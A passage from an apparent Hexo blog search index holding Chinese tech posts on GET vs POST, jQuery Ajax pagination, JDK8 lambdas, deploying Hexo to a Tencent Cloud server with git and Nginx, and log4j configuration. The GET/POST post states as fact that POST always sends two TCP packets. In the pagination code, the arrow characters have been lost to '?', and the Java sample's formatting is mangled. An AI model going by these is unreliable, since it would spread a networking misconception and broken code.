实现多态，有二种方式，覆盖，重载。</p>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP 请求的 GET 与 POST 方式的区别</title>
      <link href="2018/07/16/http-qing-qiu-de-get-yu-post-fang-shi-de-qu-bie/"/>
      <url>2018/07/16/http-qing-qiu-de-get-yu-post-fang-shi-de-qu-bie/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP-请求的-GET-与-POST-方式的区别"><a href="#HTTP-请求的-GET-与-POST-方式的区别" class="headerlink" title="HTTP 请求的 GET 与 POST 方式的区别"></a>HTTP 请求的 GET 与 POST 方式的区别</h1><blockquote><p>GET和POST是什么？HTTP协议中的两种发送请求的方法。</p></blockquote><blockquote><p>HTTP是什么？HTTP是基于TCP/IP的关于数据如何在万维网中如何通信的协议。</p></blockquote><ul><li>HTTP的底层是TCP/IP。所以GET和POST的底层也是TCP/IP，也就是说，GET/POST都是TCP链接。</li></ul><ul><li>GET和POST本质上就是TCP链接，并无差别。</li></ul><h3 id="GET和POST还有一个重大区别："><a href="#GET和POST还有一个重大区别：" class="headerlink" title="GET和POST还有一个重大区别："></a>GET和POST还有一个重大区别：</h3><ul><li>GET产生一个TCP数据包；POST产生两个TCP数据包。</li></ul><h3 id="小栗子"><a href="#小栗子" class="headerlink" title="小栗子:"></a>小栗子:</h3><ul><li><p>对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；</p></li><li><p>对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。</p></li></ul><p>因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑！跳入需谨慎。为什么？</p><ol><li><p>GET与POST都有自己的语义，不能随便混用。</p></li><li><p>据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。</p></li><li><p>并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。</p></li></ol><p><strong>官方说法：</strong></p><blockquote><ul><li>根据 HTTP 规范，GET 用于信息获取，而且应该是安全的和幂等的。</li><li>根据 HTTP 规范，POST 表示可能修改变服务器上的资源的请求。</li><li>首先是 “GET 方式提交的数据最多只能是 1024 字节”，因为 GET 是通过 URL 提交数据，那么 GET 可提交的数据量就跟 URL 的长度有直接关系了。而实际上，URL 不存在参数上限的问题，HTTP 协议规范没有对 URL 长度进行限制。这个限制是特定的浏览器及服务器对它的限制。IE 对 URL 长度的限制是 2083 字节(2K+35)。对于其他浏览器，如 Netscape、FireFox 等，理论上没有长度限制，其限制取决于操作系统的支持。注意这是限制是整个 URL 长度，而不仅仅是你的参数值数据长度。</li><li>POST 是没有大小限制的，HTTP 协议规范也没有进行大小限制</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ajax分页</title>
      <link href="2018/07/12/ajax-fen-ye/"/>
      <url>2018/07/12/ajax-fen-ye/</url>
      
        <content type="html"><![CDATA[<h3 id="Ajax分页已经封装完成-简单快捷使用-可遍历部分属性"><a href="#Ajax分页已经封装完成-简单快捷使用-可遍历部分属性" class="headerlink" title="Ajax分页已经封装完成 简单快捷使用[可遍历部分属性]"></a>Ajax分页已经封装完成 简单快捷使用[可遍历部分属性]</h3><p>修改自己的请求地址  </p><p><strong>注意</strong>： 样式需要导入bootstrap样式会好看一点</p><p>分页查询链接 返回的是一个总数目的int 值  在数据库查总条数就可以了</p><p><strong>单页数据查询返回的是一个json格式的数组</strong> </p><p><strong>注意：</strong> 需要导入jQuery的jar包</p><p>代码如下：</p><pre><code>var page=1;      var pageend=0;      /**       *       * 每页条目数量pagecount       *       */      var pagecount=5;      /**       *       * headnames  分页标题名称  按照顺序书写       *       */      var headnames=new Array(&quot;id&quot;,&quot;用户名&quot;,&quot;where are you from&quot;)      /**       *       * notlookattr  不需要遍历的对象属性       *       */      var notlookattr=new Array(&quot;pwd&quot;)      /**       *       * Numberhref  分页查询 链接       *       */      var Numberhref=&quot;/user/selectPzd&quot;;      /**       *       * limithref  单页数据查询 链接       *       */      var limithref=&quot;/user/selectPzdLimit&quot;;      /**       *       * 刷新分页方法*********************    flseh()  *******       *       */      var pagechange=1;      function  pageTurn(data){          console.log(data)          if(data==&quot;?&quot;){              if(page!=1){                  page=page-1;                  flseh();              }          }else if(data==&quot;?&quot;){              if(page!=pageend){                  page=parseInt(page)+1;                  flseh();              }          }else if(data==&quot;...&quot;){              var endli=$(&quot;#pages li&quot;).slice($(&quot;#pages li&quot;).length-4,$(&quot;#pages li&quot;).length-3);              pagechange=endli.text();              page=pagechange;              flseh()          }else if(data==&quot;.&quot;){              var endli=$(&quot;#pages li&quot;).slice(2,3);              if(endli.text()!=1){                  pagechange=parseInt(endli.text())-10;                  page=pagechange;              }              flseh()          }else{              page=parseInt(data);              flseh();          }      }      function flseh(){          $.post(Numberhref,function (data) {              $(&quot;#pages li&quot;).remove();              pageend=data/pagecount;              $(&quot;#pages&quot;).append(&#39;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&amp;#171;&lt;/a&gt;&lt;/li&gt;&#39;)              $(&quot;#pages&quot;).append(&#39;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;.&lt;/a&gt;&lt;/li&gt;&#39;)              for (var i=pagechange;i&lt;data/pagecount+1;i++){                  $(&quot;#pages&quot;).append(&#39;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&#39;+i+&#39;&lt;/a&gt;&lt;/li&gt;&#39;)                  if(i-pagechange&gt;10){                      $(&quot;#pages&quot;).append(&#39;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;...&lt;/a&gt;&lt;/li&gt;&#39;)                      break;                  }              }              $(&quot;#pages&quot;).append(&#39;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&amp;#187;&lt;/a&gt;&lt;/li&gt;&#39;)          })          $(&quot;.usershead td&quot;).remove();          for (var i = 0; i &lt;headnames.length ; i++) {              $(&quot;.usershead&quot;).append(&#39;&lt;td&gt;&#39;+ headnames[i]+&#39;&lt;/td&gt;&#39;)          }          $.post(limithref,{begin:(page-1)*pagecount,end:pagecount},function (data) {              $(&quot;#users tr&quot;).remove();              for (var i=0;i&lt;pagecount;i++){                  $(&quot;#users&quot;).append(&#39;&lt;tr id=&quot;&#39;+i+&#39;pagerow&quot;&gt;&lt;/tr&gt;&#39;)                  Object.getOwnPropertyNames(data[i]).forEach(function (key) {                      var notlookboo=true;                      for(var j=0;j&lt;notlookattr.length;j++){                          if(key==notlookattr[j]){                              notlookboo=false;                          }                      }                      if(notlookboo){                          $(&quot;tr[id=&#39;&quot;+i+&quot;pagerow&#39;]&quot;).append((&#39;&lt;td&gt;&#39; + data[i][key]+ &#39;&lt;/td&gt;&#39;))                      }                  })              }          })      }</code></pre><h2 id="html代码"><a href="#html代码" class="headerlink" title="html代码"></a>html代码</h2><p><strong>注意：</strong> 样式需要导入bootstrap样式会好看一点</p><pre><code>&lt;table class=&quot;table table-hover&quot;&gt;        &lt;thead&gt;            &lt;tr class=&quot;usershead&quot;&gt;&lt;/tr&gt;        &lt;/thead&gt;        &lt;tbody id=&quot;users&quot;&gt;        &lt;/tbody&gt;    &lt;/table&gt;    &lt;ul class=&quot;pagination&quot; id=&quot;pages&quot;&gt;    &lt;/ul&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Ajax </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分页 </tag>
            
            <tag> Ajax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDK8的新特性</title>
      <link href="2018/07/09/jdk8-de-xin-te-xing/"/>
      <url>2018/07/09/jdk8-de-xin-te-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="JDK8-新特性"><a href="#JDK8-新特性" class="headerlink" title="JDK8 新特性"></a>JDK8 新特性</h1><p>以下列出两点重要特性：</p><ul><li><p>Lambda 表达式（匿名函数）</p></li><li><p>Stream 多线程并行数据处理（重要）</p><h1 id="新特性"><a href="#新特性" class="headerlink" title="新特性"></a>新特性</h1></li><li><p>接口的默认方法只需要使用 <code>default</code> 关键字即可，这个特征又叫做 扩展方法</p></li><li><p>Lambda 表达式</p></li><li><p>Functional 接口  <strong>函数式接口</strong> 是指仅仅只包含一个抽象方法的接口，每一个该类型的 Lambda 表达式都会被匹配到这个抽象方法。你只需要给你的接口添加 <code>@FunctionalInterface</code> 注解</p></li><li><p>使用 <code>::</code> 双冒号关键字来传递方法(静态方法和非静态方法)</p></li><li><p>Predicate 接口和 Lambda 表达式</p></li><li><p>Function 接口</p><ul><li>Function 有一个参数并且返回一个结果，并附带了一些可以和其他函数组合的默认方法</li><li>compose 方法表示在某个方法之前执行</li><li>andThen 方法表示在某个方法之后执行</li><li>注意：compose 和 andThen 方法调用之后都会把对象自己本身返回，这可以 <strong>方便链式编程</strong></li></ul></li><li><p>Supplier 接口，返回一个任意范型的值，和 Function 接口不同的是该接口 <strong>没有任何参数</strong></p></li><li><p>Consumer 接口，接收一个任意范型的值，和 Function 接口不同的是该接口 <strong>没有任何值</strong></p></li><li><p>Optional 类</p><ul><li>Optional 不是接口而是一个类，这是个用来防止 <code>NullPointerException</code> 异常的辅助类型</li><li>Optional 被定义为一个简单的容器，其值可能是 null 或者不是 null。</li><li>在 Java8 之前一般某个函数应该返回非空对象但是偶尔却可能返回了 null，而在 Java8 中，不推荐你返回 null 而是返回 Optional。</li><li>这是一个可以为 null 的容器对象。</li><li>如果值存在则 <code>isPresent()</code> 方法会返回 true，调用 <code>get()</code> 方法会返回该对象。<h1 id="小栗子"><a href="#小栗子" class="headerlink" title="小栗子"></a>小栗子</h1><pre><code>package com.lele.jdk8.feature.lambda;</code></pre></li></ul></li></ul><p>import java.util.Arrays;<br>import java.util.List;<br>import java.util.stream.Collectors;</p><p>/**</p><ul><li><p>Lambda 基本用法</p></li><li><p>Title: BaseLambda</p></li><li><p>Description: </p></li><li></li><li><p>@author Lusifer</p></li><li><p>@version 1.0.0</p></li><li><p>@date 2019/1/6 10:42</p></li><li><p>/<br>public class BaseLambda {<br>  public static void main(String[] args) {</p><pre><code>  testForeach();  testStreamDuplicates();</code></pre><p>  }</p><p>  /**</p><ul><li><p>Lambda 遍历</p></li><li><p>/<br>public static void testForeach() {<br>  // 定义一个数组<br>  String[] array = {</p><pre><code>      &quot;尼尔机械纪元&quot;,      &quot;关于我转生成为史莱姆这件事&quot;,      &quot;实力至上主义教师&quot;,      &quot;地狱少女&quot;</code></pre><p>  };</p><p>  // 转换成集合<br>  List<string> acgs = Arrays.asList(array);</string></p><p>  // 传统的遍历方式<br>  System.out.println(“传统的遍历方式：”);<br>  for (String acg : acgs) {</p><pre><code>  System.out.println(acg);</code></pre><p>  }<br>  System.out.println();</p><p>  // 使用 Lambda 表达式以及函数操作(functional operation)<br>  System.out.println(“Lambda 表达式以及函数操作：”);<br>  acgs.forEach((acg) -&gt; System.out.println(acg));<br>  System.out.println();</p><p>  // 在 Java 8 中使用双冒号操作符(double colon operator)<br>  System.out.println(“使用双冒号操作符：”);<br>  acgs.forEach(System.out::println);<br>  System.out.println();<br>}</p><p>/**</p></li><li><p>Stream 去重复</p></li><li><p>String 和 Integer 可以使用该方法去重</p></li><li><p>/<br>public static void testStreamDuplicates() {<br>  System.out.println(“Stream 去重复：”);</p><p>  // 定义一个数组<br>  String[] array = {</p><pre><code>      &quot;尼尔机械纪元&quot;,      &quot;尼尔机械纪元&quot;,      &quot;关于我转生成为史莱姆这件事&quot;,      &quot;关于我转生成为史莱姆这件事&quot;,      &quot;实力至上主义教师&quot;,      &quot;实力至上主义教师&quot;,      &quot;地狱少女&quot;,      &quot;地狱少女&quot;</code></pre><p>  };</p><p>  // 转换成集合<br>  List<string> acgs = Arrays.asList(array);</string></p><p>  // Stream 去重复<br>  acgs = acgs.stream().distinct().collect(Collectors.toList());</p><p>  // 打印<br>  acgs.forEach(System.out::println);<br>}<br>}<br>```</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
            <tag> Jdk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 博客部署到腾讯云教程</title>
      <link href="2018/07/03/hexo-bo-ke-bu-shu-dao-teng-xun-yun-jiao-cheng/"/>
      <url>2018/07/03/hexo-bo-ke-bu-shu-dao-teng-xun-yun-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<blockquote><ul><li>本文首发于我的个人博客：<a href="leblog.github.io">乐乐的博客</a></li><li>文章链接：<a href>传送门</a></li></ul></blockquote><blockquote><p>本篇内容用来讲述如何将 hexo 博客部署到腾讯云的服务器上。<br>只要通过三步即可成功部署：</p><ul><li>云服务器端 git 的配置</li><li>Nginx 的配置</li><li>本地端 hexo 的设置更改</li></ul></blockquote><p>下面开始正式讲解如何部署。</p><p><strong>前期需要准备</strong>：</p><ul><li>一个腾讯云服务器</li><li>hexo 本地博客</li></ul><p>顺便说下我的服务器环境：<br>| 操作系统            | CPU | 内存  | 带宽    |<br>|—————–|—–|—–|——-|<br>| CentOS 7.2 64位 | 1核  | 2GB | 1Mbps |</p><h1 id="1-进入云服务器中"><a href="#1-进入云服务器中" class="headerlink" title="1. 进入云服务器中"></a>1. 进入云服务器中</h1><ul><li>首先点击下边网站，登录你的进入云服务器的控制台<br>腾讯云服务器的控制台：<a href="https://console.cloud.tencent.com/cvm/index" target="_blank" rel="noopener">https://console.cloud.tencent.com/cvm/index</a></li></ul><p><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/864802B7DBE0495F912DBFCD76517FFE/1290" alt></p><ul><li>左边菜单选择云主机，然后找到你的服务器。点击登录<br><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/8C43CC8C4D3D456F96D1C0FC5704994E/1291" alt></li><li>输入密码，进入 云服务器 CentOS中。（初始密码在控制台右上角的消息列表中）<br><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/19E9FE5BE3B647C7AB13DA3559D22D24/1289" alt></li></ul><h1 id="2-云服务器端配置-git"><a href="#2-云服务器端配置-git" class="headerlink" title="2. 云服务器端配置 git"></a>2. 云服务器端配置 git</h1><p>1.安装依赖库和编译工具</p><ul><li><p>安装依赖库：</p><blockquote><p>yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel </p></blockquote></li><li><p>安装编译工具：</p><blockquote><p>yum install gcc perl-ExtUtils-MakeMaker package</p></blockquote></li></ul><p>2.下载git</p><ul><li>选择一个目录来存放下载下来的git安装包。这里选择了<code>/usr/local/src</code>目录</li></ul><blockquote><p> cd /usr/local/src</p></blockquote><ul><li>到官网找一个新版稳定的源码包下载到 <code>/usr/local/src</code> 文件夹里</li></ul><blockquote><p>wget <a href="https://www.kernel.org/pub/software/scm/git/git-2.16.2.tar.gz" target="_blank" rel="noopener">https://www.kernel.org/pub/software/scm/git/git-2.16.2.tar.gz</a></p></blockquote><ul><li><p>解压编译 git</p></li><li><p>在当前目录下解压 <code>git-2.16.2.tar.gz</code></p></li></ul><blockquote><p>tar -zvxf git-2.16.2.tar.gz</p></blockquote><ul><li>进入 git-2.16.2.tar.gz 目录下</li></ul><blockquote><p>cd git-2.16.2</p></blockquote><ul><li>执行编译</li></ul><blockquote><p>make all prefix=/usr/local/git</p></blockquote><ul><li>安装 git 到 <code>/usr/local/git</code> 目录下</li></ul><blockquote><p>make install prefix=/usr/local/git</p></blockquote><p>4.配置 git 环境变量</p><ul><li>将 git 加入 PATH 目录中</li></ul><blockquote><p>echo ‘export PATH=$PATH:/usr/local/git/bin’ &gt;&gt; /etc/bashrc</p></blockquote><ul><li>使 git 环境变量生效</li></ul><blockquote><p>source /etc/bashrc</p></blockquote><p>5.查看 git 版本</p><blockquote><p>git –version</p></blockquote><p>如果此时能查看到 git 的版本号，说明我们已经安装成功了。</p><p>6.创建 git 仓库，用于存放博客网站资源。</p><ul><li>在 <code>home/git</code> 的目录下，创建一个名为<code>hexoBlog</code>的裸仓库（bare repo）。<br>如果没有 <code>home/git</code> 目录，需要先创建；然后修改目录的所有权和用户权限。</li></ul><blockquote><p>mkdir /home/git/<br><br>chown -R $USER:$USER /home/git/<br><br>chmod -R 755 /home/git/</p></blockquote><p>然后，执行如下命令：</p><blockquote><p>cd /home/git/<br><br>git init –bare hexoBlog.git</p></blockquote><p>刚才这一步主要创建一个裸的 git 仓库。</p><p>7.创建一个新的 git 钩子，用于自动部署。</p><ul><li>在 <code>/home/git/hexoBlog.git</code> 下，有一个自动生成的<code>hooks</code> 文件夹。我们需要在里边新建一个新的钩子文件 <code>post-receive</code>。</li></ul><blockquote><p>vim /home/git/hexoBlog.git/hooks/post-receive</p></blockquote><p>按 <code>i</code>键进入文件的编辑模式，在该文件中添加两行代码（将下边的代码粘贴进去)，指定 Git 的工作树（源代码）和 Git 目录（配置文件等）。</p><blockquote><p>#!/bin/bash<br><br>git –work-tree=/home/hexoBlog –git-dir=/home/git/hexoBlog.git checkout -f</p></blockquote><p>然后，按<code>Esc</code>键退出编辑模式，输入<code>:wq</code>保存退出。<br>修改文件权限，使得其可执行。</p><blockquote><p>chmod +x /home/git/hexoBlog.git/hooks/post-receive</p></blockquote><p>到这里，我们的 git 仓库算是完全搭建好了。下面进行 Nginx 的配置。</p><h1 id="3-云服务器端配置-Nginx"><a href="#3-云服务器端配置-Nginx" class="headerlink" title="3.云服务器端配置 Nginx"></a>3.云服务器端配置 Nginx</h1><p>安装 Nginx<br>yum install -y nginx<br>启动 Nginx<br>service nginx start<br>测试 Nginx 服务器<br>wget <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a><br>能够正常获取以下欢迎页面说明Nginx安装成功。</p><pre><code>Connecting to 127.0.0.1:80... connected.HTTP request sent, awaiting response... 200 OKLength: 43704 (43K) [text/html]Saving to: ‘index.html’100%[=======================================&gt;] 43,704      --.-K/s   in 0s2018-03-09 23:04:09 (487 MB/s) - ‘index.html’ saved [43704/43704]</code></pre><ul><li><p>测试网页是否能打开<br>在浏览器中输入服务器 ip 地址，就是服务器的公网 ip。</p></li><li><p>配置 Nginx 托管文件目录</p><ul><li>接下来，创建 <code>/home/hexoBlog</code>目录，用于 <code>Nginx</code> 托管。<blockquote><p>mkdir /home/hexoBlog/<br><br>chown -R $USER:$USER /home/hexoBlog/<br><br>chmod -R 755 /home/hexoBlog/</p></blockquote></li></ul></li><li><p>查看 Nginx 的默认配置的安装位置</p></li></ul><blockquote><p>nginx -t</p></blockquote><ul><li>修改Nginx的默认配置，其中 cd 后边就是刚才查到的安装位置（每个人可能都不一样）</li></ul><blockquote><p>vim /etc/nginx/nginx.conf</p></blockquote><ul><li>按方向键，找到如下位置</li></ul><pre><code>server {    listen 80 default_server;    listen [::]:80 default_server;    root /home/hexoBlog;    #需要修改    server_name www.bujige.net; #需要修改    # Load configuration files for the default server block.    include /etc/nginx/default.d/*.conf;    location / {    }    error_page 404 /404.html;        location = /40x.html {    }</code></pre><p>按<code>i</code>键进入插入模式，将其中的 root 值改为<code>/home/hexoBlog</code> （刚才创建的托管仓库目录）。<br>将 server_name 值改成你的域名。</p><ul><li>重启 Nginx 服务</li></ul><blockquote><p>service nginx restart</p></blockquote><p>至此，服务器端配置就结束了。接下来，就剩下本地 hexo 的配置更改了。</p><h1 id="4-修改-hexo-站点配置文件-git-相关设置"><a href="#4-修改-hexo-站点配置文件-git-相关设置" class="headerlink" title="4. 修改 hexo 站点配置文件 git 相关设置"></a>4. 修改 hexo 站点配置文件 git 相关设置</h1><ul><li>打开你本地的 hexo 博客所在文件，打开站点配置文件（不是主题配置文件），做以下修改。</li></ul><blockquote><p>deploy:<br><br>    type: git<br><br>    repo: root@CVM 你的云服务器的IP地址:/home/git/hexoBlog<br><br>    branch: master</p></blockquote><ul><li>在 hexo 目录下执行部署，试试看。</li></ul><blockquote><p>cd 你的 hexo 目录<br><br>hexo clean<br><br>hexo generate<br><br>hexo deploy<br></p></blockquote><ul><li><p>打开你的公网 IP，看是不是已经部署成功了。<br><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/BD3DBBB4EC2E49ABA90A87DE1E9C7875/1416" alt></p></li><li><p>最后一步，更改域名解析。这一步不再做介绍。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j的使用</title>
      <link href="2018/06/11/log4j-de-shi-yong/"/>
      <url>2018/06/11/log4j-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>一个完整的软件，日志是必不可少的。程序从开发、测试、维护、运行等环节，都需要向控制台或文件等位置输出大量信息。这些信息的输出， 在很多时候是使用 <code>System.out.println()</code> 无法完成的。</p><p>日志信息根据用途与记录内容的不同，分为 <strong>调试日志、运行日志、异常日志</strong>等。</p><p><code>Log4j</code> 的全称为 <code>Log for java</code>，即专门用于 Java 语言的日志记录工具。</p><h1 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h1><p>为了方便对于日志信息的输出显示，对日志内容进行了分级管理。日志级别由高到低，共分 6 个级别：</p><ul><li>fatal(致命的)</li><li>error</li><li>warn</li><li>info</li><li>debug</li><li>trace(堆栈)<h1 id="为什么要对日志进行分级"><a href="#为什么要对日志进行分级" class="headerlink" title="为什么要对日志进行分级"></a>为什么要对日志进行分级</h1></li></ul><p>无论是将日志输出到控制台，还是文件，其输出都会降低程序的运行效率。但由于调试、运行维护的需要，客户的要求等原因，需要进行必要的日志输出。这时就必须要在代码中加入日志输出语句。</p><p>这些输出语句若在程序运行时全部执行， 则势必会降低运行效率。例如， 使用 System.out.println() 将信息输出到控制台，则所有的该输出语句均将执行。会大大降低程序的执行效率。而要使其不输出，唯一的办法就是将这些输出语句逐个全部删除。这是个费时费力的过程。</p><p>将日志信息进行分级管理，便可方便的控制信息输出内容及输出位置：哪些信息需要输出，哪些信息不需要输出，只需在一个日志输出控制文件中稍加修改即可。而代码中的输出语句不用做任何修改。</p><p>从这个角度来说，代码中的日志编写，其实就是写大量的输出语句。只不过，这些输出语句比较特殊，它们具有级别，在程序运行期间不一定被执行。它们的执行是由另一个控制文件控制。</p><h1 id="日志输出简介"><a href="#日志输出简介" class="headerlink" title="日志输出简介"></a>日志输出简介</h1><p>Log4j 的日志输出控制文件，主要由三个部分构成：</p><ul><li>日志信息的输出位置：控制日志信息将要输出的位置，是控制台还是文件等。</li><li>日志信息的输出格式：控制日志信息的显示格式，即以怎样的字符串形式显示。</li><li>日志信息的输出级别：控制日志信息的显示内容，即显示哪些级别的日志信息。<br>有了日志输出控制文件，代码中只要设置好日志信息内容及其级别即可，通过控制文件便可控制这些日志信息的输出了。</li></ul><h1 id="日志属性配置文件"><a href="#日志属性配置文件" class="headerlink" title="日志属性配置文件"></a>日志属性配置文件</h1><p>日志属性文件 <code>log4j.properties</code> 是专门用于控制日志输出的。其主要进行三方面控制：</p><p>输出位置：控制日志将要输出的位置，是控制台还是文件等。<br>输出布局：控制日志信息的显示形式。<br>输出级别：控制要输出的日志级别。<br>日志属性文件由两个对象组成：日志附加器与根日志。</p><p>根日志，即为 Java 代码中的日志记录器，其主要由两个属性构成：日志输出级别与日志附加器。</p><p>日志附加器，则由日志输出位置定义，由其它很多属性进行修饰，如输出布局、文件位置、文件大小等。</p><h1 id="什么是日志附加器？"><a href="#什么是日志附加器？" class="headerlink" title="什么是日志附加器？"></a>什么是日志附加器？</h1><p>所谓日志附加器，就是为日志记录器附加上很多其它设置信息。附加器的本质是一个接口，其定义语法为：<code>log4j.appender.appenderName</code> = <code>输出位置</code></p><h1 id="常用的附加器实现类"><a href="#常用的附加器实现类" class="headerlink" title="常用的附加器实现类"></a>常用的附加器实现类</h1><ul><li><p>org.apache.log4j.ConsoleAppender：日志输出到控制台</p></li><li><p>org.apache.log4j.FileAppender：日志输出到文件</p></li><li><p>org.apache.log4j.RollingFileAppender：当日志文件大小到达指定尺寸的时候将产生一个新的日志文件</p></li><li><p>org.apache.log4j.DailyRollingFileAppender：每天产生一个日志文件</p><h1 id="常用布局类型"><a href="#常用布局类型" class="headerlink" title="常用布局类型"></a>常用布局类型</h1></li><li><p>org.apache.log4j.HTMLLayout：网页布局，以 HTML 表格形式布局</p></li><li><p>org.apache.log4j.SimpleLayout：简单布局，包含日志信息的级别和信息字符串</p></li><li><p>org.apache.log4j.PatternLayout：匹配器布局，可以灵活地指定布局模式。其主要是通过设置 PatternLayout 的 ConversionPattern 属性值来控制具体输出格式的 。<br>打印参数: Log4J 采用类似 C 语言中的 printf 函数的打印格式格式化日志信息</p></li><li><p>%m：输出代码中指定的消息</p></li><li><p>%p：输出优先级，即 DEBUG，INFO，WARN，ERROR，FATAL</p></li><li><p>%r：输出自应用启动到输出该 log 信息耗费的毫秒数</p></li><li><p>%c：输出所属的类目，通常就是所在类的全名</p></li><li><p>%t：输出产生该日志事件的线程名</p></li><li><p>%n：输出一个回车换行符，Windows 平台为 /r/n，Unix 平台为 /n</p></li><li><p>%d：输出日志时间点的日期或时间，默认格式为 ISO8601，也可以在其后指定格式，比如：%d{yyy MMM dd HH:mm:ss , SSS}，输出类似：2002年10月18日 22:10:28,921</p></li><li><p>%l：输出日志事件的发生位置，包括类目名、发生的线程，以及在代码中的行数。举例：Testlog4.main(TestLog4.java: 10 )</p></li></ul><h1 id="Slf4j-简介"><a href="#Slf4j-简介" class="headerlink" title="Slf4j 简介"></a>Slf4j 简介</h1><p>slf4j 的全称是 Simple Loging Facade For Java，即它仅仅是一个为 Java 程序提供日志输出的统一接口，并不是一个具体的日志实现方案，就比如 JDBC 一样，只是一种规则而已。所以单独的 slf4j 是不能工作的，必须搭配其他具体的日志实现方案，比如 apache 的 <code>org.apache.log4j.Logger</code>，JDK 自带的 <code>java.util.logging.Logger</code> 以及 log4j 等。<br>(Slf4j只有实现，也就是一个接口)</p><h1 id="POM"><a href="#POM" class="headerlink" title="POM"></a>POM</h1><p>继续之前的项目，pom.xml 配置如下：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;          xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;groupId&gt;com.funtl&lt;/groupId&gt;    &lt;artifactId&gt;hello-spring&lt;/artifactId&gt;    &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt;    &lt;packaging&gt;jar&lt;/packaging&gt;    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework&lt;/groupId&gt;            &lt;artifactId&gt;spring-context&lt;/artifactId&gt;            &lt;version&gt;4.3.17.RELEASE&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;junit&lt;/groupId&gt;            &lt;artifactId&gt;junit&lt;/artifactId&gt;            &lt;version&gt;4.12&lt;/version&gt;            &lt;scope&gt;test&lt;/scope&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;            &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt;            &lt;version&gt;1.7.25&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;&lt;/project&gt;</code></pre><p>主要增加了<code>org.slf4j:slf4j-log4j12</code> 依赖</p><h1 id="创建-log4j-properties配置文件"><a href="#创建-log4j-properties配置文件" class="headerlink" title="创建 log4j.properties配置文件"></a>创建 <code>log4j.properties</code>配置文件</h1><p>在 <code>src/main/resources</code> 目录下创建名为<code>log4j.properties</code> 的属性配置文件</p><pre><code>log4j.rootLogger=INFO, console, filelog4j.appender.console=org.apache.log4j.ConsoleAppenderlog4j.appender.console.layout=org.apache.log4j.PatternLayoutlog4j.appender.console.layout.ConversionPattern=%d %p [%c] - %m%nlog4j.appender.file=org.apache.log4j.DailyRollingFileAppenderlog4j.appender.file.File=logs/log.loglog4j.appender.file.layout=org.apache.log4j.PatternLayoutlog4j.appender.A3.MaxFileSize=1024KBlog4j.appender.A3.MaxBackupIndex=10log4j.appender.file.layout.ConversionPattern=%d %p [%c] - %m%n</code></pre><p>日志配置相关说明：</p><ul><li><code>log4j.rootLogger</code>：根日志，配置了日志级别为 INFO，预定义了名称为 console、file 两种附加器</li><li><code>log4j.appender.console</code>：console 附加器，日志输出位置在控制台</li><li><code>log4j.appender.console.layout</code>：console 附加器，采用匹配器布局模式</li><li><code>log4j.appender.console.layout.ConversionPattern</code>：console 附加器，日志输出格式为：日期 日志级别 [类名] - 消息换行符</li><li><code>log4j.appender.file</code>：file 附加器，每天产生一个日志文件</li><li><code>log4j.appender.file.File</code>：file 附加器，日志文件输出位置 logs/log.log</li><li><code>log4j.appender.file.layout</code>：file 